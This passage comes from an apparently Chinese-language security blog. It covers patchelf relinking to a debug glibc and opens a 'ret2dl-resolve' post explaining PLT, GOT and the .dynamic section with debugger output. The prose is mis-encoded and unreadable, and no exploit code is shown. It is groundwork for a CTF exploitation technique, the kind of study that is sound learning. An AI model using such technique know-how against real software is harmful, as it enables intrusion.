<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; info types link_map</span><br><span class="line">All types matching regular expression <span class="string">&quot;link_map&quot;</span>:</span><br><span class="line"></span><br><span class="line">File ../elf/link.h:</span><br><span class="line"><span class="number">101</span>:    <span class="class"><span class="keyword">struct</span> <span class="title">link_map_public</span>;</span></span><br><span class="line"></span><br><span class="line">File ../include/link.h:</span><br><span class="line"><span class="number">95</span>:     <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span>;</span></span><br><span class="line"><span class="number">286</span>:    <span class="class"><span class="keyword">struct</span> <span class="title">link_map_reldeps</span>;</span></span><br><span class="line"></span><br><span class="line">File ../nptl_db/db_info.c:</span><br><span class="line"><span class="number">40</span>:     <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> <span class="title">link_map</span>;</span></span><br><span class="line"></span><br><span class="line">File ../sysdeps/x86/linkmap.h:</span><br><span class="line"><span class="number">10</span>:     <span class="class"><span class="keyword">struct</span> <span class="title">link_map_machine</span>;</span></span><br></pre></td></tr></table></figure>





<h2 id="patch-elfä¿®æ”¹ç¨‹åºé“¾æ¥glibc"><a href="#patch-elfä¿®æ”¹ç¨‹åºé“¾æ¥glibc" class="headerlink" title="patch-elfä¿®æ”¹ç¨‹åºé“¾æ¥glibc"></a>patch-elfä¿®æ”¹ç¨‹åºé“¾æ¥glibc</h2><p>å¯¹äºä¸€ä¸ªå·²ç»ç¼–è¯‘é“¾æ¥å®Œæ¯•,é»˜è®¤é“¾æ¥ç³»ç»Ÿè‡ªå¸¦glibcçš„ç¨‹åº,å¦‚ä½•è®©å®ƒä½¿ç”¨æˆ‘ä»¬ç¼–è¯‘çš„glibcå‘¢</p>
<p>å¯ä»¥ä½¿ç”¨patch-elfä¿®æ”¹ç¨‹åºï¼Œä¸€æ˜¯ä¿®æ”¹libcæ‰€åœ¨ç›®å½•çš„ä½ç½®ï¼ŒäºŒæ˜¯ä¿®æ”¹ä½¿ç”¨çš„é“¾æ¥å™¨çš„ç»å¯¹åœ°å€</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf --<span class="built_in">set</span>-rpath /home/glibc/lib/ --<span class="built_in">set</span>-interpreter /home/glibc/lib/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> main</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿Executor)-[/home/glibc-test]</span><br><span class="line">â””â”€# make main</span><br><span class="line">gcc main.c -o main -no-pie -g -O0</span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootã‰¿Executor)-[/home/glibc-test]</span><br><span class="line">â””â”€# make ldd</span><br><span class="line">ldd main</span><br><span class="line">        linux-vdso.so.1 (0x00007fff8e1b2000)</span><br><span class="line">        libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f02aebae000)</span><br><span class="line">        /lib64/ld-linux-x86-64.so.2 (0x00007f02aedb3000)</span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootã‰¿Executor)-[/home/glibc-test]</span><br><span class="line">â””â”€# make patch</span><br><span class="line">patchelf --set-rpath /home/glibc/lib/ --set-interpreter /home/glibc/lib/ld-linux-x86-64.so.2 main</span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootã‰¿Executor)-[/home/glibc-test]</span><br><span class="line">â””â”€# make ldd</span><br><span class="line">ldd main</span><br><span class="line">        linux-vdso.so.1 (0x00007fff70bfc000)</span><br><span class="line">        libc.so.6 =&gt; /home/glibc/lib/libc.so.6 (0x00007f8ab9eef000)</span><br><span class="line">        /home/glibc/lib/ld-linux-x86-64.so.2 =&gt; /lib64/ld-linux-x86-64.so.2 (0x00007f8aba126000)</span><br><span class="line">        </span><br><span class="line">â”Œâ”€â”€(rootã‰¿Executor)-[/home/glibc-test]</span><br><span class="line">â””â”€# ./main</span><br><span class="line">helloworld</span><br></pre></td></tr></table></figure>

<p>æ”¹å®Œäº†ä¹‹ålddè§‚å¯Ÿç»“æœå’Œåœ¨ç¼–è¯‘é“¾æ¥æ—¶æŒ‡å®šæˆ‘ä»¬çš„glibcæ•ˆæœæ˜¯ä¸€æ ·çš„</p>
<p>è™½ç„¶æ”¹å®Œäº†ldçš„åœ°å€çœ‹ä¸Šå»è¿˜æ˜¯æŒ‡å‘åŸæ¥é‚£ä¸ª<code>/home/glibc/lib/ld-linux-x86-64.so.2 =&gt; /lib64/ld-linux-x86-64.so.2</code></p>
<p>ä½†æ˜¯è°ƒè¯•è§‚å¯Ÿå®é™…ä¸Šå·²ç»æ”¹è¿‡äº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gefâ¤  info sharedlibrary </span><br><span class="line">From                To                  Syms Read   Shared Object Library</span><br><span class="line">0x00007f5aff5a5000  0x00007f5aff5c8f91  Yes         /home/glibc/lib/ld-linux-x86-64.so.2</span><br><span class="line">0x00007f5aff38f3c0  0x00007f5aff4d8c9d  Yes         /home/glibc/lib/libc.so.6</span><br></pre></td></tr></table></figure>








































      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2024/10/17/ret2dl-resolve/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/10/17/ret2dl-resolve/" class="post-title-link" itemprop="url">ret2dl-resolve</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-10-17 23:19:00" itemprop="dateCreated datePublished" datetime="2024-10-17T23:19:00+08:00">2024-10-17</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-11-23 21:32:09" itemprop="dateModified" datetime="2024-11-23T21:32:09+08:00">2024-11-23</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="ret2dl-resolve"><a href="#ret2dl-resolve" class="headerlink" title="ret2dl-resolve"></a>ret2dl-resolve</h1><p>åœ¨å­¦ä¹ è¿™éƒ¨åˆ†ä¹‹å‰ï¼Œæœ€å¥½æœ‰å¸¦è°ƒè¯•ç¬¦å·çš„libcå’Œld,</p>
<p>ä¹Ÿå°±æ˜¯è¯´è‡ªå·±ç¼–è¯‘ä¸€ä¸ªå¾…è°ƒè¯•ç¬¦å·çš„glibc</p>
<p>ç„¶åç¼–è¯‘é“¾æ¥ç¨‹åºæ—¶æŒ‡å®šä½¿ç”¨æˆ‘ä»¬çš„glibc,ä¸ç”¨ç³»ç»Ÿè‡ªå¸¦é‚£ä¸ª</p>
<p>æˆ–è€…ç”¨patchelfæŠŠç¨‹åºé“¾æ¥çš„glibcè°ƒåŒ…</p>
<p>ç„¶è€Œè°ƒè¯•ç‰ˆå’Œå‘è¡Œç‰ˆè°ƒç”¨çš„å‡½æ•°å¥½åƒä¸å¤ªä¸€æ ·</p>
<h2 id="å»¶è¿Ÿç»‘å®š"><a href="#å»¶è¿Ÿç»‘å®š" class="headerlink" title="å»¶è¿Ÿç»‘å®š"></a>å»¶è¿Ÿç»‘å®š</h2><p>å‡è®¾æœ‰ç¨‹åº</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">&quot;Hello, world!\n&quot;</span>, <span class="number">14</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc test.c -O0 -g -no-pie -m32 -o test</span><br></pre></td></tr></table></figure>

<p>writeå‡½æ•°ä½äºlibc.soä¸­ï¼Œmainç¨‹åºæ˜¯å¦‚ä½•ä¸writeç¬¦å·é“¾æ¥çš„å‘¢ï¼Ÿ</p>
<p>è¿™ä¸ªè¿‡ç¨‹å«åšå»¶è¿Ÿç»‘å®šï¼Œåˆå«åšæ‡’åŠ è½½ï¼Œæ„æ€æ˜¯æˆ‘ä»¬çš„ç¨‹åºç¬¬ä¸€æ¬¡è°ƒç”¨åŠ¨æ€åº“ä¸­çš„ç¬¦å·æ—¶ï¼ŒåŠ¨æ€è¿æ¥å™¨ldæ‰ä¼šè§£æwriteå‡½æ•°</p>
<p>è¿™ä¸ªè§£æè¿‡ç¨‹å¦‚ä¸‹</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A1.png" alt="ç¬¬ä¸€æ¬¡è§£æ"></p>
<p>ç»è¿‡ç¬¬ä¸€æ¬¡è§£æ,write@gotè¢«å¡«å……äº†æ­£ç¡®çš„writeåœ°å€,æ­¤åçš„writeè°ƒç”¨å°†å¦‚å›¾æ‰€ç¤º</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A2.png" alt="æ­¤åçš„è°ƒç”¨"></p>
<p>è¿™é‡Œé¢æåˆ°äº†ä¸¤ä¸ªè¡¨ï¼ŒPLTè¡¨ï¼ŒGOTè¡¨</p>
<p>å¦‚æœgdbåŠ äº†pwndbgæ’ä»¶ï¼Œå¯ä»¥ä½¿ç”¨pltå’Œgotå‘½ä»¤è§‚å¯Ÿä¸¤è€…</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; elfheader</span><br><span class="line">0x8048194 - 0x80481b4  .interp</span><br><span class="line">0x80481b4 - 0x80481d8  .note.gnu.build-id</span><br><span class="line">0x80481d8 - 0x80481f8  .note.ABI-tag</span><br><span class="line">0x80481f8 - 0x8048218  .gnu.hash</span><br><span class="line">0x8048218 - 0x8048268  .dynsym</span><br><span class="line">0x8048268 - 0x80482d1  .dynstr</span><br><span class="line">0x80482d2 - 0x80482dc  .gnu.version</span><br><span class="line">0x80482dc - 0x804830c  .gnu.version_r</span><br><span class="line">0x804830c - 0x8048314  .rel.dyn</span><br><span class="line">0x8048314 - 0x8048324  .rel.plt</span><br><span class="line">0x8049000 - 0x8049020  .init</span><br><span class="line">0x8049020 - 0x8049050  .plt</span><br><span class="line">0x8049050 - 0x80491a6  .text</span><br><span class="line">0x80491a8 - 0x80491bc  .fini</span><br><span class="line">0x804a000 - 0x804a013  .rodata</span><br><span class="line">0x804a014 - 0x804a048  .eh_frame_hdr</span><br><span class="line">0x804a048 - 0x804a110  .eh_frame</span><br><span class="line">0x804bef8 - 0x804befc  .init_array</span><br><span class="line">0x804befc - 0x804bf00  .fini_array</span><br><span class="line">0x804bf00 - 0x804bff0  .dynamic</span><br><span class="line">0x804bff0 - 0x804bff4  .got</span><br><span class="line">0x804bff4 - 0x804c008  .got.plt</span><br><span class="line">0x804c008 - 0x804c010  .data</span><br><span class="line">0x804c010 - 0x804c014  .bss</span><br><span class="line"></span><br><span class="line">pwndbg&gt; plt</span><br><span class="line">0x8049030: __libc_start_main@plt</span><br><span class="line">0x8049040: <span class="built_in">printf</span>@plt</span><br><span class="line">pwndbg&gt; got</span><br><span class="line"></span><br><span class="line">GOT protection: Partial RELRO | GOT <span class="built_in">functions</span>: 2</span><br><span class="line"></span><br><span class="line">[0x804c000] __libc_start_main@GLIBC_2.34 -&gt; 0xf7cf8cf0 (__libc_start_main_impl) â—‚â€” push   ebp</span><br><span class="line">[0x804c004] <span class="built_in">printf</span>@GLIBC_2.0 -&gt; 0x8049046 (<span class="built_in">printf</span>@plt+6) â—‚â€” push   8</span><br></pre></td></tr></table></figure>



<h3 id="PLTçš„ä½œç”¨"><a href="#PLTçš„ä½œç”¨" class="headerlink" title="PLTçš„ä½œç”¨"></a>PLTçš„ä½œç”¨</h3><p>å¯¹æ¯ä¸€ä¸ªglibcä¸­çš„å‡½æ•°func,éƒ½ä¼šæœ‰ä¸€ä¸ªpltè¡¨é¡¹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jmp * func@got</span><br><span class="line">push index</span><br><span class="line">jmp * _dl_runtime_resolve@got</span><br></pre></td></tr></table></figure>

<p>å¦‚æœgotä¸­å¡«å†™äº†æ­£ç¡®çš„å‡½æ•°åœ°å€,åˆ™ä¼šç›´æ¥è°ƒç”¨è¯¥å‡½æ•°</p>
<p>å¦‚æœgotä¸­å¡«å†™äº†push indexçš„åœ°å€,åˆ™è°ƒç”¨_dl_runtime_resolveè§£æç¬¦å·</p>
<p>è§£æç¬¦å·çš„ä¾æ®å°±æ˜¯è¿™ä¸ªindex,å¯¼å…¥å‡½æ•°ä¸‹æ ‡</p>
<p>.plt(procedure Linkage Tableï¼Œè¿‡ç¨‹é“¾æ¥è¡¨)</p>
<p>.plt.gotä¸“é—¨ç”¨äºå­˜æ”¾<code>__cxa_finalize</code>å‡½æ•°çš„pltæ¡ç›®</p>
<h3 id="GOTçš„ä½œç”¨"><a href="#GOTçš„ä½œç”¨" class="headerlink" title="GOTçš„ä½œç”¨"></a>GOTçš„ä½œç”¨</h3><p>å­˜æ”¾å‡½æ•°åœ°å€</p>
<p>å¦‚æœå°šæœªè§£æåˆ™å­˜æ”¾å¯¹åº”å‡½æ•°pltä¸­çš„ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€</p>
<p>GOTè¡¨åˆ†æˆä¸¤éƒ¨åˆ†</p>
<p>.gotå’Œ.got.plt</p>
<p>.got(Global Offset Table),å…¨å±€å˜é‡åœ°å€è¡¨</p>
<p>.got.pltæ˜¯å…¨å±€å‡½æ•°åœ°å€è¡¨</p>
<p>å‰é¢æˆ‘ä»¬æ‰€è¯´çš„write@gotå®é™…ä¸Šæ˜¯<a href="mailto:&#119;&#x72;&#x69;&#116;&#101;&#x40;&#x67;&#x6f;&#x74;&#46;&#x70;&#108;&#x74;">&#119;&#x72;&#x69;&#116;&#101;&#x40;&#x67;&#x6f;&#x74;&#46;&#x70;&#108;&#x74;</a></p>
<p>.gotè¡¨çº¯çº¯å­˜æ”¾å…¨å±€å˜é‡åœ°å€,æœ‰ä¸€ä¸ªç®—ä¸€ä¸ª,æ²¡æœ‰ç‰¹åˆ«ä¹‹å¤„</p>
<p>.got.pltçš„å‰ä¸‰ä¸ªè¡¨é¡¹å­˜æ”¾äº†ç‰¹æ®Šåœ°å€,å…¶åçš„è¡¨é¡¹å°±æ˜¯å…¨å±€å‡½æ•°åœ°å€äº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.got.plt:0804A000 14 9F 04 08                   _GLOBAL_OFFSET_TABLE_ dd offset _DYNAMIC</span><br><span class="line">.got.plt:0804A000                                                                       ; DATA XREF: _init_proc+9â†‘o</span><br><span class="line">.got.plt:0804A000                                                                       ; _start+10â†‘o ...</span><br><span class="line">.got.plt:0804A004 00 00 00 00                   dword_804A004   dd 0                    ; DATA XREF: sub_80482D0â†‘r</span><br><span class="line">.got.plt:0804A008 00 00 00 00                   dword_804A008   dd 0                    ; DATA XREF: sub_80482D0+6â†‘r</span><br><span class="line">.got.plt:0804A00C 24 A0 04 08                   off_804A00C     dd offset __libc_start_main</span><br><span class="line">.got.plt:0804A00C                                                                       ; DATA XREF: ___libc_start_mainâ†‘r</span><br><span class="line">.got.plt:0804A010 28 A0 04 08                   off_804A010     dd offset write         ; DATA XREF: _writeâ†‘r</span><br><span class="line">.got.plt:0804A010                               _got_plt        ends</span><br></pre></td></tr></table></figure>

<h4 id="GOT-PLT-0-dynamic"><a href="#GOT-PLT-0-dynamic" class="headerlink" title=".GOT.PLT[0]&#x3D;.dynamic"></a>.GOT.PLT[0]&#x3D;.dynamic</h4><p>.GOT.PLT[0]å­˜æ”¾.dynamicèŠ‚çš„åœ°å€,åœ¨èŠ‚å¤´è¡¨ä¸­å¯ä»¥æŸ¥çœ‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/CTF-All-In-One/src/writeup/6.1.3_pwn_xdctf2015_pwn200# readelf -S test</span><br><span class="line">There are 35 section headers, starting at offset 0x1fbc:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">	...</span><br><span class="line">  [21] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4</span><br><span class="line">	...</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),</span><br><span class="line">  L (link order), O (extra OS processing required), G (group), T (TLS),</span><br><span class="line">  C (compressed), x (unknown), o (OS specific), E (exclude),</span><br><span class="line">  p (processor specific)</span><br></pre></td></tr></table></figure>

<p>.dynamicèŠ‚åœ¨0x08049f14,å› æ­¤GOT[0]&#x3D;0x08049f14</p>
<p>è¿™ä¸ªèŠ‚çš„ä½œç”¨æ˜¯ä»€ä¹ˆå‘¢?</p>
<p>å¯ä»¥ç”¨readelf -dæŸ¥çœ‹èŠ‚å†…å®¹</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/CTF-All-In-One/src/writeup/<span class="number">6.1</span><span class="number">.3</span>_pwn_xdctf2015_pwn200<span class="meta"># readelf -d test</span></span><br><span class="line"></span><br><span class="line">Dynamic section at offset <span class="number">0xf14</span> contains <span class="number">24</span> entries:</span><br><span class="line">  Tag        Type                         Name/Value</span><br><span class="line"> <span class="number">0x00000001</span> (NEEDED)                     Shared library: [libc.so<span class="number">.6</span>]</span><br><span class="line"> <span class="number">0x0000000c</span> (INIT)                       <span class="number">0x80482ac</span></span><br><span class="line"> <span class="number">0x0000000d</span> (FINI)                       <span class="number">0x80484d4</span></span><br><span class="line"> <span class="number">0x00000019</span> (INIT_ARRAY)                 <span class="number">0x8049f0c</span></span><br><span class="line"> <span class="number">0x0000001b</span> (INIT_ARRAYSZ)               <span class="number">4</span> (bytes)</span><br><span class="line"> <span class="number">0x0000001a</span> (FINI_ARRAY)                 <span class="number">0x8049f10</span></span><br><span class="line"> <span class="number">0x0000001c</span> (FINI_ARRAYSZ)               <span class="number">4</span> (bytes)</span><br><span class="line"> <span class="number">0x6ffffef5</span> (GNU_HASH)                   <span class="number">0x80481ac</span></span><br><span class="line"> <span class="number">0x00000005</span> (STRTAB)                     <span class="number">0x804821c</span></span><br><span class="line"> <span class="number">0x00000006</span> (SYMTAB)                     <span class="number">0x80481cc</span></span><br><span class="line"> <span class="number">0x0000000a</span> (STRSZ)                      <span class="number">75</span> (bytes)</span><br><span class="line"> <span class="number">0x0000000b</span> (SYMENT)                     <span class="number">16</span> (bytes)</span><br><span class="line"> <span class="number">0x00000015</span> (DEBUG)                      <span class="number">0x0</span></span><br><span class="line"> <span class="number">0x00000003</span> (PLTGOT)                     <span class="number">0x804a000</span></span><br><span class="line"> <span class="number">0x00000002</span> (PLTRELSZ)                   <span class="number">16</span> (bytes)</span><br><span class="line"> <span class="number">0x00000014</span> (PLTREL)                     REL</span><br><span class="line"> <span class="number">0x00000017</span> (JMPREL)                     <span class="number">0x804829c</span></span><br><span class="line"> <span class="number">0x00000011</span> (REL)                        <span class="number">0x8048294</span></span><br><span class="line"> <span class="number">0x00000012</span> (RELSZ)                      <span class="number">8</span> (bytes)</span><br><span class="line"> <span class="number">0x00000013</span> (RELENT)                     <span class="number">8</span> (bytes)</span><br><span class="line"> <span class="number">0x6ffffffe</span> (VERNEED)                    <span class="number">0x8048274</span></span><br><span class="line"> <span class="number">0x6fffffff</span> (VERNEEDNUM)                 <span class="number">1</span></span><br><span class="line"> <span class="number">0x6ffffff0</span> (VERSYM)                     <span class="number">0x8048268</span></span><br><span class="line"> <span class="number">0x00000000</span> (<span class="literal">NULL</span>)                       <span class="number">0x0</span></span><br></pre></td></tr></table></figure>

<p>æ¯ä¸€é¡¹éƒ½æ˜¯ä¸€ä¸ª<code>Elf32_Dyn</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Sword d_tag;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        Elf32_Word d_val;</span><br><span class="line">        Elf32_Addr d_ptr;</span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br></pre></td></tr></table></figure>

<p>è¿™æ˜¯ä¸€ä¸ªé”®å€¼å¯¹,é”®æ˜¯d_tag,å€¼è¦ä¹ˆæ˜¯d_valè¦ä¹ˆæ˜¯d_ptr</p>
<p>d_tagæ˜¯ä¸€äº›æšä¸¾å€¼</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> DT_NULL    0   <span class="comment">/* Marks end of dynamic section */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_NEEDED  1   <span class="comment">/* Name of needed library */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_PLTRELSZ 2  <span class="comment">/* Size in bytes of PLT relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_PLTGOT  3   <span class="comment">/* Processor defined value */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_HASH    4   <span class="comment">/* Address of symbol hash table */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_STRTAB  5   <span class="comment">/* Address of string table */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_SYMTAB  6   <span class="comment">/* Address of symbol table */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_RELA    7   <span class="comment">/* Address of Rela relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_RELASZ  8   <span class="comment">/* Total size of Rela relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_STRSZ   10  <span class="comment">/* Size in bytes of string table */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_SYMENT  11  <span class="comment">/* Size of one symbol table entry */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_INIT    12  <span class="comment">/* Address of init function */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_FINI    13  <span class="comment">/* Address of termination function */</span></span></span><br></pre></td></tr></table></figure>



<p>è¿™ä¸ªèŠ‚æŒ‡ç¤ºäº†å¾ˆå¤šä¿¡æ¯,æ¯”å¦‚initå‡½æ•°å’Œinit_arrayçš„åœ°å€</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x0000000c</span> (INIT)                       <span class="number">0x80482ac</span></span><br><span class="line"><span class="number">0x00000019</span> (INIT_ARRAY)                 <span class="number">0x8049f0c</span></span><br></pre></td></tr></table></figure>

<p>æ¯”å¦‚ç¬¦å·è¡¨å’Œå­—ç¬¦ä¸²è¡¨åœ°å€</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x00000005 (STRTAB)                     0x804821c</span><br><span class="line">0x00000006 (SYMTAB)                     0x80481cc</span><br></pre></td></tr></table></figure>

<p>æ¯”å¦‚é‡å®šä½ä¿¡æ¯</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x00000011</span> (REL)                        <span class="number">0x8048294</span></span><br></pre></td></tr></table></figure>



<p>è¿™ä¸ªè¡¨æœ‰ä½•ä½œç”¨å‘¢?</p>
<p>ä¸€æ˜¯æŒ‡å¯¼åŠ¨æ€é“¾æ¥å™¨è¿›è¡Œ</p>
<p>â€‹	åŠ è½½so</p>
<p>â€‹	è§£æç¬¦å·</p>
<p>â€‹	é‡å®šä½</p>
<p>â€‹	è°ƒç”¨åˆå§‹åŒ–å‡½æ•°</p>
<p>äºŒæ˜¯è¿è¡Œæ—¶</p>
<p>â€‹	å»¶è¿Ÿç»‘å®š</p>
<p>â€‹	å¤„ç†dlopenæ˜¾ç¤ºåŠ è½½çš„å‡½æ•°</p>
<blockquote>
<p>å…³äºé‡å®šä½</p>
